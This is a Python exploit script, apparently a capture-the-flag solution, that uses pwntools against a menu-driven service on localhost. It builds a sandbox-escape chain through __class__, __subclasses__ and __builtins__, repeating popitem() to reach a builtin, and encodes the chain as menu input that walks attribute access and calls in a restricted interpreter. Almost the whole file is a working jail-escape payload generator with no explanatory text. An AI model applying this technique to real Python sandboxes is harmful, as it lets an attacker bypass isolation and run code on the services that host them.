#!/usr/bin/env python3

from pwn import remote

chain = b'__class__.__class__.__bases__.__iter__().__next__().__subclasses__()'
chain = b"orig.__class__.__class__.__bases__.__iter__().__next__().__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__['help']'"

chain = b'''
__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.popitem().__class__.__class__.__base__.__subclasses__().__reversed__().__iter__().__next__().__enter__.__builtins__.values().__reversed__().__iter__().__next__()
'''.strip()

# r = remote('localhost', 5000)
# r.recvuntil(b'choose > ')

payload = b''

for cmd in chain.split(b'.'):
    # print()
    # r.sendline(b'1\n' + cmd.strip(b'()'))
    payload += b'1\n' + cmd.strip(b'()') + b'\n'
    # data = r.recvuntil(b'choose > ')

    # print(data)
    if cmd.endswith(b'()'):
        # print('executing')
        # r.sendline(b'2')
        payload += b'2\n'
        # data = r.recvuntil(b'choose > ')
    # print(data)

payload += b'2\n'

# r.interactive()

print(100 * '\n')
print(payload.decode())
